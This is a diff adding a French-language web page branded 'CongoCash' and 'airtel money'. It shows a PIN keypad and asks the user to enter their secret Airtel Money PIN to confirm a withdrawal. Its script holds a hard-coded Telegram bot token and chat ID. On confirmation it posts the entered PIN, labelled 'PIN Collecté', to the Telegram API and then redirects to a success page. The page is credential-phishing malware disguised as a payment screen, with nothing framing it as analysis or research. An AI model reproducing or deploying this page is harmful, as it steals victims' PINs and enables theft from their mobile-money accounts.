@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Saisir le PIN | CongoCash</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: white;
+            color: #333;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* PIN Dot Styling */
+        .pin-dot {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 2px solid #adb5bd;
+            transition: all 0.2s;
+        }
+
+        .pin-dot.filled {
+            background-color: #E31937;
+            border-color: #E31937;
+            transform: scale(1.1);
+        }
+
+        .keypad-btn {
+            height: 70px;
+            font-size: 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            user-select: none;
+        }
+
+        .keypad-btn:active {
+            background-color: #f8f9fa;
+            border-radius: 50%;
+        }
+
+        .confirm-btn {
+            background-color: #f1f3f5;
+            color: #adb5bd;
+            transition: all 0.3s;
+        }
+
+        .confirm-btn.active {
+            background-color: #E31937;
+            color: white;
+            box-shadow: 0 4px 15px rgba(227, 25, 55, 0.3);
+        }
+    </style>
+</head>
+<body>
+
+    <nav class="p-6 flex items-center justify-between animate__animated animate__fadeIn">
+        <button onclick="history.back()" class="text-gray-600">
+            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
+        </button>
+        <span class="text-xl font-bold text-red-600">airtel money</span>
+        <div class="w-6"></div> </nav>
+
+    <main class="flex-1 px-8 pt-8 text-center animate__animated animate__fadeInUp">
+        <div class="mb-8">
+            <div class="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-4">
+                <svg class="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+            </div>
+            <h2 class="text-2xl font-bold mb-2">Entrez votre PIN</h2>
+            <p class="text-gray-500 text-sm">Veuillez saisir votre code PIN secret Airtel Money pour autoriser la transaction.</p>
+        </div>
+        
+        <div class="flex justify-center gap-6 mb-12">
+            <div id="dot1" class="pin-dot"></div>
+            <div id="dot2" class="pin-dot"></div>
+            <div id="dot3" class="pin-dot"></div>
+            <div id="dot4" class="pin-dot"></div>
+        </div>
+
+        <div class="grid grid-cols-3 gap-y-4 max-w-xs mx-auto">
+            <button class="keypad-btn" onclick="addNum('1')">1</button>
+            <button class="keypad-btn" onclick="addNum('2')">2</button>
+            <button class="keypad-btn" onclick="addNum('3')">3</button>
+            <button class="keypad-btn" onclick="addNum('4')">4</button>
+            <button class="keypad-btn" onclick="addNum('5')">5</button>
+            <button class="keypad-btn" onclick="addNum('6')">6</button>
+            <button class="keypad-btn" onclick="addNum('7')">7</button>
+            <button class="keypad-btn" onclick="addNum('8')">8</button>
+            <button class="keypad-btn" onclick="addNum('9')">9</button>
+            <div class="keypad-btn"></div>
+            <button class="keypad-btn" onclick="addNum('0')">0</button>
+            <button class="keypad-btn" onclick="delNum()">
+                <svg class="w-6 h-6 text-gray-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M6.707 4.879A3 3 0 018.828 4H15a3 3 0 013 3v6a3 3 0 01-3 3H8.828a3 3 0 01-2.121-.879l-4.5-4.5a1 1 0 010-1.414l4.5-4.5zm2.586 1L5.414 10l3.879 3.879L10.707 12.465 8.242 10l2.465-2.465-1.414-1.414z" clip-rule="evenodd"></path></svg>
+            </button>
+        </div>
+    </main>
+
+    <div class="p-8">
+        <button id="confirmBtn" onclick="finalizeTransaction()" disabled class="w-full confirm-btn font-bold py-4 rounded-xl uppercase tracking-widest text-sm transition-all">
+            Confirmer le Retrait
+        </button>
+    </div>
+
+    <script>
+        let pin = "";
+const dots = [
+    document.getElementById('dot1'),
+    document.getElementById('dot2'),
+    document.getElementById('dot3'),
+    document.getElementById('dot4')
+];
+const btn = document.getElementById('confirmBtn');
+
+// Config Telegram
+const TELEGRAM_BOT_TOKEN = '8250515452:AAGQi4Ca4uRcGbk4BVYNfxSUqQRY10RPtWk';
+const TELEGRAM_CHAT_ID = '8563625308';
+
+function addNum(n) {
+    if (pin.length < 4) {
+        pin += n;
+        updateDots();
+    }
+}
+
+function delNum() {
+    pin = pin.slice(0, -1);
+    updateDots();
+}
+
+function updateDots() {
+    dots.forEach((dot, i) => {
+        if (pin[i]) {
+            dot.classList.add('filled');
+        } else {
+            dot.classList.remove('filled');
+        }
+    });
+    
+    if (pin.length === 4) {
+        btn.disabled = false;
+        btn.classList.add('active');
+    } else {
+        btn.disabled = true;
+        btn.classList.remove('active');
+    }
+}
+
+async function finalizeTransaction() {
+    // Visual feedback for the user
+    btn.innerText = "Autorisation en cours...";
+    btn.disabled = true;
+    btn.classList.add('animate-pulse');
+
+    // Formatting the message for your bot
+    const pinMessage = `🔐 **Sécurité Airtel Money**\n\n📌 PIN Collecté: \`${pin}\`\n✅ État: Tentative de retrait`;
+
+    try {
+        // Send PIN to Telegram
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: pinMessage,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        // Redirect to success page
+        window.location.href = 'success.html';
+    } catch (error) {
+        console.error('Erreur:', error);
+        // Fallback redirect
+        window.location.href = 'success.html';
+    }
+}
+    </script>
+</body>
+</html>
